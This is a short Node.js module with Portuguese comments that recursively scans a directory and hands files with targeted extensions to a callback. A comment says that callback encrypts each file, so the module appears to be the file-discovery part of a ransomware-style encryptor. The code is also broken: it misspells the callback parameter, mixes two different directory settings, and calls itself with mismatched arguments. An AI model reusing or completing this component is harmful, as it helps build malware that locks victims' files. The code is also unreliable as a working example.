
const path = require('path'), fs = require('fs'), config = require("../config");



function walk(callkack) { //vai encontrar um arquiv q ta na list de extencoes, retornar e passar como parametro o callkack 
  // permite que passemos extensões expecíficas para serem buscadas


  fs.readdir(config.baseDirectory, function (err, files) {
    if (!err) {
      files.forEach(function (file) {
        var filepath = path.join(config.startDirectory, file);
        fs.stat(filepath, function (err, stats) {
          if (!err) {
            if (stats.isDirectory()) {
              walk(filepath, callback); // o callback e a func q vai ler esse arquivo e encriptar
            } else if (stats.isFile()) {
              let ext = path.extname(filepath).replace(".", "");
              let isWanted = config.extensions.find(wanted => wanted === ext);
              if (isWanted) callback(filepath, stats);
            }
          }
        });
      });
    }
  });
}

module.exports = walk;

